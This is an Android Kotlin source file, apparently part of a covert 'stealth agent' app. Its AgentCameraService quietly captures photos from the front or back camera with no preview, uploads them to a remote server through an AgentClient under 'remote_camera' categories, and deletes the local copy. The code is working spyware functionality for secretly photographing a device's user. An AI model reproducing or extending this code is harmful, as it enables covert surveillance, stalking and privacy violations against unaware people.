package com.stealthagent.service

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import androidx.core.content.ContextCompat
import com.stealthagent.network.AgentClient
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class AgentCameraService @Inject constructor(
    @ApplicationContext private val context: Context,
    private val client: AgentClient,
) {
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null

    private fun ensureThread() {
        if (cameraThread?.isAlive != true) {
            cameraThread = HandlerThread("AgentCamera").apply { start() }
            cameraHandler = Handler(cameraThread!!.looper)
        }
    }

    @Suppress("MissingPermission")
    suspend fun capturePhoto(useFrontCamera: Boolean): Boolean = withContext(Dispatchers.IO) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) !=
            PackageManager.PERMISSION_GRANTED) return@withContext false

        ensureThread()
        val handler = cameraHandler ?: return@withContext false
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

        val facing = if (useFrontCamera) CameraCharacteristics.LENS_FACING_FRONT
                     else CameraCharacteristics.LENS_FACING_BACK
        val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
            cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == facing
        } ?: return@withContext false

        val width = if (useFrontCamera) 640 else 1280
        val height = if (useFrontCamera) 480 else 960
        val reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1)
        val latch = CountDownLatch(1)
        var capturedBytes: ByteArray? = null

        reader.setOnImageAvailableListener({ imgReader ->
            val image = imgReader.acquireLatestImage() ?: return@setOnImageAvailableListener
            val buffer = image.planes[0].buffer
            capturedBytes = ByteArray(buffer.remaining())
            buffer.get(capturedBytes!!)
            image.close()
            latch.countDown()
        }, handler)

        runCatching {
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                        addTarget(reader.surface)
                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                    }
                    camera.createCaptureSession(listOf(reader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                session.capture(request.build(), object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(
                                        session: CameraCaptureSession, request: CaptureRequest,
                                        result: android.hardware.camera2.TotalCaptureResult,
                                    ) { session.close(); camera.close() }
                                }, handler)
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                camera.close(); latch.countDown()
                            }
                        }, handler)
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close(); latch.countDown() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close(); latch.countDown() }
            }, handler)
        }.onFailure { reader.close(); return@withContext false }

        latch.await(5, TimeUnit.SECONDS)
        reader.close()

        val bytes = capturedBytes ?: return@withContext false
        val side = if (useFrontCamera) "front" else "back"
        val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val file = File(context.cacheDir, "remote_${side}_$ts.jpg")
        file.writeBytes(bytes)

        val ok = client.uploadFile(
            fileBytes = bytes,
            fileName = file.name,
            mimeType = "image/jpeg",
            category = "remote_camera_$side",
        )
        file.delete()
        ok
    }

    fun release() {
        cameraThread?.quitSafely()
        cameraThread = null
        cameraHandler = null
    }
}
